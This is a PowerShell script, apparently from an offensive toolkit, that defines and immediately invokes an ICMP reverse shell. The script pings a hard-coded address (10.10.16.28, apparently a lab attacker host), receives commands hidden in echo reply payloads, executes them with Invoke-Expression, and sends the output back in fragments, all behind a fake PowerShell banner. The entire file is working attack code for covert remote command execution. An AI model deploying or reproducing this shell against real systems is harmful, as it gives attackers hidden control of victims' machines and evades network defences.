function Invoke-PowerShellIcmp
{ 
    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $false)]
        [Int]
        $Delay = 5,

        [Parameter(Position = 2, Mandatory = $false)]
        [Int]
        $BufferSize = 128

    )

    #Basic structure from http://stackoverflow.com/questions/20019053/sending-back-custom-icmp-echo-response
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $True

    # Shell appearance and output redirection based on Powerfun - Written by Ben Turner & Dave Hardy
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

    #Show an interactive PowerShell prompt
    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

    while ($true)
    {
        $sendbytes = ([text.encoding]::ASCII).GetBytes('')
        $reply = $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions)
        
        #Check for Command from the server
        if ($reply.Buffer)
        {
            $response = ([text.encoding]::ASCII).GetString($reply.Buffer)
            $result = (Invoke-Expression -Command $response 2>&1 | Out-String )
            $sendbytes = ([text.encoding]::ASCII).GetBytes($result)
            $index = [math]::floor($sendbytes.length/$BufferSize)
            $i = 0

            #Fragmant larger output into smaller ones to send to the server.
            if ($sendbytes.length -gt $BufferSize)
            {
                while ($i -lt $index )
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..(($i+1)*$BufferSize)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                    $i +=1
                }
                $remainingindex = $sendbytes.Length % $BufferSize
                if ($remainingindex -ne 0)
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..($sendbytes.Length)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                }
            }
            else
            {
                $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes, $PingOptions) | Out-Null
            }
            $sendbytes = ([text.encoding]::ASCII).GetBytes("`nPS " + (Get-Location).Path + '> ')
            $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
        }
        else
        {
            Start-Sleep -Seconds $Delay
        }
    }
}
Invoke-PowerShellIcmp -IPAddress 10.10.16.28


